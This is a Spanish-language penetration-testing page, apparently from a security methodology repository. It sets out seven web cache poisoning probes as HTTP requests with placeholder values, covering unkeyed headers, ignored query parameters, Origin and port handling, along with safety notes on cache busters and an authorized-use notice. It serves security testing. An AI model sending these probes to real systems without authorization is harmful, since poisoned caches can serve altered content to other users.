# 🗡️ Web cache poisoning: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. X-Forwarded-Host no incluido en clave

**Objetivo:** Usar URL única para no contaminar páginas comunes.

```http
GET /cache-probe-{NONCE}?cb={NONCE} HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
```

**Interpretación:** Buscar un marcador en respuesta y luego consultar la misma clave sin cabecera desde segunda sesión propia.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws).

### 2. Control sin cabecera

**Objetivo:** Comprobar si el contenido alterado se sirve desde caché.

```http
GET /cache-probe-{NONCE}?cb={NONCE} HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** La segunda respuesta debe contener el marcador previo y señales de caché; un reflejo en la primera no basta.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-poisoning).

### 3. X-Forwarded-Scheme

**Objetivo:** Comprobar si el backend genera URLs según un header no incluido en clave.

```http
GET /cache-probe-{NONCE}?cb={NONCE} HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Scheme: http
```

**Interpretación:** Comparar URL generada y clave cacheada con el control; no asumir que cambiar esquema produce XSS.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws).

### 4. Query ignorada por caché

**Objetivo:** Detectar parámetro que el backend usa y la caché descarta.

```http
GET /cache-probe-{NONCE}?cb={NONCE}&lang=canary-A HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Repetir con `lang=canary-B` y comparar respuesta/`Age`. Mantener recurso único y público.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws).

### 5. Cabecera Origin

**Objetivo:** Verificar si CORS varía sin Vary ni clave adecuada.

```http
GET /cache-probe-{NONCE} HTTP/1.1
Host: {ORIGEN}
Origin: https://{CONTROLLED_HOST}
```

**Interpretación:** Comparar ACAO entre dos orígenes propios; hay riesgo si caché entrega política cruzada útil.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-poisoning).

### 6. Unkeyed port

**Objetivo:** Comprobar si backend refleja puerto y caché lo elimina de su clave.

```http
GET /cache-probe-{NONCE} HTTP/1.1
Host: {ORIGEN}:12345
```

**Interpretación:** Solo si el proxy acepta el host. Confirmar que la respuesta alterada se almacena y alcanza otro cliente.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws).

### 7. Cache buster controlado

**Objetivo:** Evitar efectos persistentes en recursos compartidos.

```text
/cache-probe-{NONCE}?cb={NONCE}
```

**Interpretación:** Si el parámetro no forma parte de la clave, escoger una ruta única en lugar de una página popular.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/web-cache-poisoning).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
